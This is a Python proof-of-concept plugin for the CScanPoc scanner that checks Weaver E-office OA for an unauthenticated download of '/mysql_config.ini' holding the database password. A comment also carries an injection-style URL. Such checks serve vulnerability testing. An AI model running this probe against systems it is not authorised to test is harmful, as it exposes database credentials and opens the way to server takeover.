# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    vuln_id = 'weaver_0006' # 平台漏洞编号，留空
    name = '泛微Eoffice无需登录直接getshell' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INFO_LEAK # 漏洞类型
    disclosure_date = '2015-03-24'  # 漏洞公布时间
    desc = '''
        泛微Eoffice无需登录，直接获取数据库链接文件，直接拿shell
    ''' # 漏洞描述
    ref = '' # 漏洞来源/weaver/weaver.email.FileDownloadLocation?download=1&fileid=-2%20or%201=2
    cnvd_id = '' # cnvd漏洞编号
    cve_id = '' #cve编号
    product = '泛微OA'  # 漏洞应用名称
    product_version = ''  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'eaa0418b-b524-4579-90a5-ccc8912c0d9e'
    author = '国光'  # POC编写者
    create_date = '2018-05-11' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = '/mysql_config.ini'
            url = '{target}'.format(target=self.target)+payload
            code, head,res, errcode, _ = hh.http(url)
            if 'datapassword' in res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()